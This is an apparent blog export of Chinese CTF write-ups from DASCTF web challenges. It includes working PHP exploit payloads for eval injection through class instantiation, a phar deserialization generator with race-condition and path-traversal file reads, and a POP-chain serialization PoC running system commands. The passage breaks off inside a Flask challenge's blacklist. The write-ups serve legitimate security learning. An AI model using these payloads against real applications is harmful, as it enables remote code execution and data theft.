<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$object</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Action(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过传参实例化一个类，如果这个类当前不存在则通过<code>spl_autoload_register</code>包含类文件，通过<code>properties</code>给类里面的某些属性赋值，最后执行run方法</p>
<p>之后直接去审计class目录下的四个类，我们可以发现都没有构造方法（<code>__construct</code>），所以只能从<code>run</code>入手，然后在<code>Base</code>类中可以找到我们特别想调用的方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evaluateExpression</span>(<span class="params"><span class="variable">$_expression_</span>,<span class="variable">$_data_</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_string(<span class="variable">$_expression_</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            extract(<span class="variable">$_data_</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$_expression_</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$_data_</span>[]=<span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(<span class="variable">$_expression_</span>, <span class="variable">$_data_</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>那么现在就要找最终可以调用到<code>evaluateExpression</code>方法的链子了</p>
<p>先去看<code>ListView-&gt;run</code>，调用到了<code>renderContent</code>，并通过<code>renderSection</code>方法对<code>$this-&gt;template</code>正则匹配操作，而<code>renderSection</code>判断正则匹配到的<code>renderxxx</code>是否存在方法，存在则直接调用该方法，之后就要去找可利用的方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;renderContent();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderContent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace_callback(<span class="string">&quot;/&#123;(\w+)&#125;/&quot;</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="string">&#x27;renderSection&#x27;</span>),<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">        ob_end_flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">renderSection</span>(<span class="params"><span class="variable">$matches</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$method</span>=<span class="string">&#x27;render&#x27;</span>.<span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>,<span class="variable">$method</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$method</span>();</span><br><span class="line">            <span class="variable">$html</span>=ob_get_contents();</span><br><span class="line">            ob_clean();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以在<code>TeseView</code>中发现可以利用的方法，并且这个类还继承了<code>ListView</code>类</p>
<p>这里又要回到前面，我们需要调用到<code>evaluateExpression</code>，所以就直接去找可以调用到这个方法，找到<code>renderTableRow</code>，只要<code>$this-&gt;rowHtmlOptionsExpression</code>为我们的命令就可以直接执行了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableRow</span>(<span class="params"><span class="variable">$row</span></span>) // 这里我们使用第一个<span class="title">if</span>语句调用，因为比较好利用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$htmlOptions</span>=<span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression!==<span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data[<span class="variable">$row</span>];</span><br><span class="line">            <span class="variable">$options</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">            <span class="keyword">if</span>(is_array(<span class="variable">$options</span>))</span><br><span class="line">                <span class="variable">$htmlOptions</span> = <span class="variable">$options</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       ……</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableBody</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        <span class="variable">$n</span>=count(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tbody&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$n</span>&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$row</span>=<span class="number">0</span>;<span class="variable">$row</span>&lt;<span class="variable">$n</span>;++<span class="variable">$row</span>)</span><br><span class="line">                <span class="keyword">$this</span>-&gt;renderTableRow(<span class="variable">$row</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ListView#run-&gt;ListView#renderContent-&gt;LiseView#renderSection-&gt;renderTableBody-&gt;TestView#renderTableRow-&gt;Base#evaluateExpression</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get:</span><br><span class="line">action=TestView</span><br><span class="line">post:</span><br><span class="line">properties[rowHtmlOptionsExpression]=system(&#x27;/readflag&#x27;)</span><br><span class="line">&amp;properties[template]=&#123;TableBody&#125;</span><br><span class="line">&amp;properties[data]=1</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/cc58a52e404541618bed1d1ecaebf139.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<blockquote>
<p>又又又又来复现了</p>
</blockquote>
<h3 id="soeasy-php"><a href="#soeasy-php" class="headerlink" title="soeasy_php"></a>soeasy_php</h3><ul>
<li>条件竞争</li>
</ul>
<p>有元素被隐藏了，直接去<code>edit.php</code></p>
<p><img src="https://img-blog.csdnimg.cn/82f48fbefc5148a08ac743e27a61a62b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><code>png</code>处存在任意文件读取漏洞</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">png=../edit.php&amp;flag=</span><br></pre></td></tr></table></figure>

<p>然后查看<code>uploads/head.png</code>就可以得到源码（不过这个是看别的师傅的wp审计源码发现的，但不知道别的师傅是不是这样发现的：</p>
<p><code>edit.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;error_reporting&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//ä»¥rootæéå¤å¶/flag å° /tmp/flag.txtï¼å¹¶chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filewrite</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">        file_put_contents(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = fread(<span class="variable">$f</span>, filesize(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$contents</span>,<span class="string">&quot;flag&#123;&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            filewrite(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="string">&quot;Give me flag&quot;</span>) &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;Don&#x27;t give me flag&quot;</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="variable">$flag</span>);  <span class="comment">//ä¸ç»æçæèªå·±åä¸ªflagã</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$head</span> = <span class="string">&quot;uploads/head.png&quot;</span>;</span><br><span class="line">        unlink(<span class="variable">$head</span>);</span><br><span class="line">        <span class="keyword">if</span> (symlink(<span class="variable">$filename</span>, <span class="variable">$head</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æåæ´æ¢å¤´å&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;éæ­£å¸¸æä»¶ï¼å·²è¢«å é¤&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>upload.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸ä¼ å¤´å&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$filename</span> = md5(<span class="string">&quot;png&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;uploads/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä¸ä¼ æåï¼ &quot;</span>.<span class="variable">$path</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>重点还是要看<code>edit.php</code></p>
<h4 id="非预期："><a href="#非预期：" class="headerlink" title="非预期："></a>非预期：</h4><p>简单审计一下：</p>
<p>1.第一个if语句ban掉了php协议和phar协议</p>
<p>2.第二个if语句通过symlink将我们传入的png与<code>uplaod/head.png</code>链接，导致可以任意文件读取</p>
<p>3.flag类的copyflag方法将根目录下的flag传到<code>/tmp/flag.txt</code>，并且使得<code>www-data</code>所有</p>
<p>因为存在类，而我们又想调用这个类的copyflag方法，而这个类在<code>__destruct</code>会自动调用，这里又没有明显的反序列化触发点，但又很多文件操作的函数，那就直接用<code>phar</code>协议吧</p>
<p>由于第一个if直接会正则匹配到<code>phar</code>，那就只能看后面了，本地测试之后发现可以利用<code>unlink</code>，所以现在要使得<code>symlink($filename, $head)</code>为flase就好了</p>
<p>phar：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//ä»¥rootæéå¤å¶/flag å° /tmp/flag.txtï¼å¹¶chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> flag();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;symlink.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="comment">// phar://uploads/b143915ffb6ca6b19dff97b6a93389f0.png</span></span><br></pre></td></tr></table></figure>

<p>上传之后，记录下文件的路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar://uploads/b143915ffb6ca6b19dff97b6a93389f0.png</span><br></pre></td></tr></table></figure>

<p>可以利用bp的intruder 条件竞争执行phar协议，用<code>../edit.php</code>测试的时候虽然成功了，并且我们也可以发现<code>/uploads/head.png</code>里面的内容也变成了<code>edit.php</code>的内容，但是由于想要得到<code>/tmp/flag.txt</code>内容的时候因为正则没有匹配到，直接判断文件里面存在flag，使得flag被覆盖了</p>
<p>所以我们可以构造<code>..//../../../../../tmp/flag.txt</code>，<code>//</code>用于绕过正则匹配</p>
<p><img src="https://img-blog.csdnimg.cn/53cf933879274312ab5c8e20b90d92c0.png" alt="img"></p>
<blockquote>
<p>听说这不是预期解，等之后学习一下</p>
</blockquote>
<h3 id="warmup-java"><a href="#warmup-java" class="headerlink" title="warmup-java"></a>warmup-java</h3><blockquote>
<p>太菜了 等复现吧</p>
</blockquote>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://erroratao.github.io/writeup/DASCTF2022_4th/">atao</a></p>
<p><a href="http://www.snowywar.top/?p=3077">雪殇姐姐</a></p>
]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>das</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF x SU 月赛</title>
    <url>/2022/03/30/DASCTF-x-SU-%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0%E4%B8%AD/</url>
    <content><![CDATA[<blockquote>
<p>ezpop、calc、upgdstore</p>
</blockquote>
<span id="more"></span>

<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h4><p>直接得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pop链：</p>
<blockquote>
<p>1.首先找到<code>destruct</code>方法作为入口，触发toString</p>
<p>2.what类里面转到mix类的run方法</p>
<p>3.mix的run触发crow的invoke方法</p>
<p>4.然后触发call方法调用get_flag</p>
<p>5.最后换行绕过注释</p>
</blockquote>
<p>poc:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$v1</span>,<span class="variable">$v2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1 = <span class="variable">$v1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v2 = <span class="variable">$v2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;f1 = <span class="variable">$f1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$m1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;m1 = <span class="variable">$m1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> fin(<span class="keyword">new</span> what(<span class="keyword">new</span> mix(<span class="keyword">new</span> crow(<span class="keyword">new</span> fin(<span class="keyword">new</span> mix(<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">system(\&#x27;grep -r &quot;&#123;&quot;\&#x27;);&#x27;</span>)),<span class="string">&#x27;&#x27;</span>))));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/dd21e53e9fd84bd6a15edb95d6ea3c40.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<blockquote>
<p>复现来啦 ~</p>
</blockquote>
<h4 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, url_for, render_template_string, redirect, request, current_app, session, \</span><br><span class="line">    abort, send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">s</span>):</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span 